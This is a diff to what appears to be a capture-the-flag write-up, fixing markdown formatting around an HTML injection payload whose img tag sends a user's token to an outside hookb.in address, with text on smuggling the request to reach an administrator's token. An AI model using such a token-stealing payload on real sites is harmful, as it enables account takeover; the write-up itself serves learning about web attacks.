@@ -147,7 +147,7 @@ Our *pathetic* loot from the server:
 
 After experimenting many more payloads, the final payload looks like this. It looks like the HTML injection worked and we can steal the user's token. Now we just need to smuggle the request to this page to the backend server.
 
-``"><img src="https://hookb.in/6J1enM3l90ToO0ro3Px9?steal=`
+`"><img src="https://hookb.in/6J1enM3l90ToO0ro3Px9?steal=`
 ![img src success](./Images/Challenge5_7.png)
 
 We got our own token back, this means that if the administrator visits this page, we will get the administrator token.
